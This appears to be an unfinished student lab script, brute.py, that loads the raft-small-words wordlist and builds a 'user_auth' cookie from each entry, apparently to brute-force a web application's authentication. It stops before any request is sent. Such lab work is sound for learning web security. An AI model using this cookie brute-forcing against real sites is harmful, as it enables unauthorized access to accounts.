# brute.py
# Celvis
# This is apart of lab9

# Import
import requests

# list
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

for i in lines:
    #print(i.replace("\n",""))
    myCookie = {'user_auth':i.replace("\n","")}